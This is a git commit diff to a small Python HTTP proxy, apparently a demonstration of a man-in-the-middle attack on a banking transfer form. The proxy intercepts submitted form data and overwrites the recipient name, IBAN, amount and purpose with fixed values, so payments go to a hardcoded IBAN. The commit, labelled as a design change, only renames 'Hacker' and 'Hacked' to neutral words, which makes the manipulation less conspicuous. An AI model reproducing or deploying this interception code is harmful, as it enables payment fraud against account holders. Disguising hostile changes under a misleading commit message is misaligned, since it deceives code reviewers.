5019161e3a546942dfaaf65333ab193c3f6bd370
Nihal Alizada <nihalhaleem@gmail.com>
2023-01-23 18:41:40 +0100

    new design, footer, header

--- proxy/proxy.py
+++ proxy/proxy.py
@@ -5,7 +5,6 @@ import urllib.request
 class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     
     def do_GET(self):
-        # Request an Server senden
         req = urllib.request.urlopen(self.path)
         self.send_response(req.getcode())
         self.end_headers()
@@ -18,14 +17,14 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
          # Payload umwandeln
         payload = urllib.parse.parse_qs(payload)
-        print(payload) # testen welche payload geschickt
+        print(payload)
 
         # payload maniplulieren
-        payload[b'name'] = [b'Hacker'] # "b" - String lateral um binäre Daten zu repräsentaieren 
+        payload[b'name'] = [b'user'] # "b" - String lateral um binäre Daten zu repräsentaieren 
         payload[b'iban'] = [b'DE1324567890135792468']
         payload[b'amount'] = [b'499']
-        payload[b'purpose'] = [b'Hacked']
-        print(payload) #manipulierte payload
+        payload[b'purpose'] = [b'Test']
+        print(payload)
 
         # payload wieder in bytes umwandeln
         payload = urllib.parse.urlencode(payload, doseq=True).encode()
@@ -41,7 +40,7 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(res.getcode())
         self.end_headers()
         self.wfile.write(res.read())
-
+        
 # Start the server
 try:
     socketserver.TCPServer(('', 8080), MyHTTPRequestHandler).serve_forever()
